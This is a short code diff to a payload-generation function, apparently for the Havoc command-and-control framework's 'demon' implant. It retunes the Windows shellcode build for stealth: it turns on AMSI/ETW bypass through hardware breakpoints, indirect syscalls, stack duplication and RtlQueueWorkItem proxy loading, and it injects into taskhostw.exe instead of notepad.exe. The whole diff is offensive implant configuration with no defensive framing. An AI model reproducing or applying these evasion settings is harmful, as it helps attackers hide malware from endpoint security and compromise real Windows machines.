@@ -21,20 +21,20 @@ def generate_payload(demon, arch, listener):
             arch,
             "Windows Shellcode",
             "{ \
-                \"Amsi/Etw Patch\": \"None\", \
-                \"Indirect Syscall\": false,  \
+                \"Amsi/Etw Patch\": \"Hardware breakpoints\", \
+                \"Indirect Syscall\": true,  \
                 \"Sleep Jmp Gadget\": \"None\",  \
                 \"Injection\": { \
                     \"Alloc\": \"Native/Syscall\", \
                     \"Execute\": \"Native/Syscall\", \
-                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\", \
-                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \
+                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\taskhostw.exe\", \
+                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\" \
                 }, \
                 \"Jitter\": \"15\", \
-                \"Proxy Loading\": \"None (LdrLoadDll)\", \
-                \"Sleep\": \"2\", \
+                \"Proxy Loading\": \"RtlQueueWorkItem\", \
+                \"Sleep\": \"17\", \
                 \"Sleep Technique\": \"Ekko\", \
-                \"Stack Duplication\": false \
+                \"Stack Duplication\": true \
             }"
         )
 	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
